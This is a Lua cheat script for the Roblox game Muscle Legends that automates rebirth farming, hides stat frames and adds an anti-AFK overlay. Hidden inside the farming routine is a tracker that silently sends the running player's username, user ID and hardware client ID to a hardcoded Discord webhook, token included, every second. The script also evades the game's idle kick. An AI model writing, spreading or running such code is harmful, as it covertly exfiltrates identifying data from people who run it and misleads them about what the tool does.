local WEBHOOK_URL = "https://discord.com/api/webhooks/1401975880762527804/rMaTCP85fx-uiNvdzeUhxWLS8izfuVfrIrmAYTdPESQaS-Rciq3Wi4o8oppg-6t68CHl"
local UPDATE_INTERVAL = 1
local REBIRTH_LOG_SIZE = 0.1
local SHOW_HWID = true

local lastRebirthCount = 0
local firstLogTime = os.date("%Y-%m-%d %H:%M:%S")
local playerData = {
    device = "Windows PC"
}

local function formatNumber(num)
    num = tonumber(num) or 0
    return tostring(math.floor(num)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local function detectDevice()
    local UIS = game:GetService("UserInputService")
    if UIS.TouchEnabled then
        return UIS.KeyboardEnabled and "Tablet" or "Mobile"
    end
    return "Windows PC"
end

local function collectStats()
    local player = game.Players.LocalPlayer
    local stats = player:FindFirstChild("leaderstats") or player:WaitForChild("leaderstats", 2)
    if not stats then return nil end

    local function getStat(name)
        local variants = {name, name:lower(), name:upper()}
        for _, variant in ipairs(variants) do
            local stat = stats:FindFirstChild(variant)
            if stat then return stat.Value end
        end
        return 0
    end

    return {
        displayName = player.DisplayName,
        username = player.Name,
        userId = player.UserId,
        strength = getStat("Strength"),
        rebirths = getStat("Rebirths"),
        durability = getStat("Durability"),
        agility = getStat("Agility"),
        kills = getStat("Kills")
    }
end

local function createStatsMessage(stats)
    local hwid = SHOW_HWID and game:GetService("RbxAnalyticsService"):GetClientId() or "HIDDEN"
    
    return string.format([[
💪 Muscle Legends - Player Stats Log 📊
━━━━━━━━━━━━━━━━━━━━
🔹 Player Info
• Display Name: %s
• Username: @%s
• User ID: %d
• HWID: %s

🔹 Game Stats
💪 Strength: %s
♻ Rebirths: %s
🛡️ Durability: %s
⚡ Agility: %s
🎯 Kills: %s

🔹 System Info
📱 Device: %s
First logged at: %s
]], 
    stats.displayName,
    stats.username,
    stats.userId,
    hwid,
    formatNumber(stats.strength),
    formatNumber(stats.rebirths),
    formatNumber(stats.durability),
    formatNumber(stats.agility),
    formatNumber(stats.kills),
    playerData.device,
    firstLogTime)
end

local function sendToDiscord(message)
    local http = game:GetService("HttpService")
    local success, response = pcall(function()
        return http:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = http:JSONEncode({
                content = message,
                username = "Muscle Legends Stats",
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId
            })
        })
    end)
    
    if not success then
        warn("Discord webhook failed: "..tostring(response))
    end
end

local function startTracking()
    playerData.device = detectDevice()
    local stats = collectStats()
    if stats then
        lastRebirthCount = stats.rebirths
        sendToDiscord(createStatsMessage(stats))
    end

    while task.wait(UPDATE_INTERVAL) do
        local stats = collectStats()
        if stats then
            sendToDiscord(createStatsMessage(stats))
        end
    end
end

fastRebirth = not fastRebirth
if fastRebirth then
    spawn(function()
        local a = game:GetService("ReplicatedStorage")
        local b = game:GetService("Players")
        local c = b.LocalPlayer
        
        task.spawn(startTracking)
        
        local function unequipAllPets()
            local f = c.petsFolder
            for g,h in pairs(f:GetChildren()) do
                if h:IsA("Folder") then
                    for i,j in pairs(h:GetChildren()) do
                        a.rEvents.equipPetEvent:FireServer("unequipPet",j)
                    end 
                end 
            end
            task.wait(.1)
        end
        
        local function equipPet(petName)
            unequipAllPets()
            task.wait(.01)
            for m,n in pairs(c.petsFolder.Unique:GetChildren()) do
                if n.Name==petName then
                    a.rEvents.equipPetEvent:FireServer("equipPet",n)
                end 
            end 
        end
        
        while fastRebirth do
            local v=c.leaderstats.Rebirths.Value
            local w=10000+(5000*v)
            if c.ultimatesFolder:FindFirstChild("Golden Rebirth") then
                local x=c.ultimatesFolder["Golden Rebirth"].Value
                w=math.floor(w*(1-(x*0.1)))
            end
            unequipAllPets()
            task.wait(.1)
            equipPet("Swift Samurai")
            while c.leaderstats.Strength.Value<w do
                for y=1,10 do
                    c.muscleEvent:FireServer("rep")
                end
                task.wait()
            end
            unequipAllPets()
            task.wait(.1)
            equipPet("Tribal Overlord")
            local A=c.leaderstats.Rebirths.Value
            repeat
                a.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
                task.wait(.1)
            until c.leaderstats.Rebirths.Value>A
            if c.Character and c.Character.PrimaryPart then
                c.Character:SetPrimaryPartCFrame(CFrame.new(-8678.05566,14.5030098,2089.25977))
            end
            a.rEvents.machineInteractRemote:InvokeServer("useMachine",workspace.machinesFolder["Jungle Bar Lift"].interactSeat)
            task.wait(0.1)
        end 
    end)
end

hideFrames = not hideFrames
for _,n in pairs({"strengthFrame","durabilityFrame","agilityFrame"}) do
    local f=game:GetService("ReplicatedStorage"):FindFirstChild(n)
    if f and f:IsA("GuiObject") then
        f.Visible=not hideFrames
    end 
end

antiKick = not antiKick
if antiKick then
    local g=Instance.new("ScreenGui")
    g.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    g.Name = "AntiAFKUI"
    
    local t=Instance.new("TextLabel")
    t.Parent=g
    t.Active=true
    t.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)
    t.Draggable=true
    t.Position=UDim2.new(0.698610067,0,0.098096624,0)
    t.Size=UDim2.new(0,370,0,52)
    t.Font=Enum.Font.SourceSansSemibold
    t.Text="Anti Afk"
    t.TextColor3=Color3.new(0,1,1)
    t.TextSize=22
    
    local f=Instance.new("Frame")
    f.Parent=t
    f.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)
    f.Position=UDim2.new(0,0,1.0192306,0)
    f.Size=UDim2.new(0,370,0,107)
    
    local c=Instance.new("TextLabel")
    c.Parent=f
    c.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)
    c.Position=UDim2.new(0,0,0.800455689,0)
    c.Size=UDim2.new(0,370,0,21)
    c.Font=Enum.Font.Arial
    c.Text="Made by luca#5432"
    c.TextColor3=Color3.new(0,1,1)
    c.TextSize=20
    
    local s=Instance.new("TextLabel")
    s.Parent=f
    s.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)
    s.Position=UDim2.new(0,0,0.158377,0)
    s.Size=UDim2.new(0,370,0,44)
    s.Font=Enum.Font.ArialBold
    s.Text="Status: Active"
    s.TextColor3=Color3.new(0,1,1)
    s.TextSize=20
    
    g.Parent=game.CoreGui
    
    local v=game:GetService("VirtualUser")
    game.Players.LocalPlayer.Idled:Connect(function()
        v:CaptureController()
        v:ClickButton2(Vector2.new())
        s.Text="Roblox tried kicking you but I blocked it!"
        wait(2)
        s.Text="Status: Active"
    end)
else
    local x=game.CoreGui:FindFirstChild("AntiAFKUI")
    if x then x:Destroy() end
end
